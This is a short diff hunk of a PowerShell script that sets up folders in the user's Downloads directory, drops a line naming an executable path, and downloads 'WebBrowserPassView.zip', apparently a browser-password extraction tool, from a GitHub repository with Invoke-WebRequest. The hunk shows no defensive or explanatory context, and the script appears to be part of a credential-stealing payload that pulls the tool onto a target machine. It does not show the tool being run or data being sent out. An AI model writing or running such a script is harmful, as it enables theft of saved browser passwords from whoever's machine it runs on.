@@ -3,7 +3,6 @@ $runDirectory="$env:USERPROFILE\downloads"
 
 $zipFolder="$runDirectory\$nameFile.zip"
 $unzipFolder="$runDirectory\$nameFile"
-$exeFile="$unzipFolder\$nameFile.exe"
 
 Set-Location -path $runDirectory
 Invoke-WebRequest -Uri "https://github.com/MaxAxoft/demo/raw/main/WebBrowserPassView.zip" -Method Get -OutFile $zipFolder
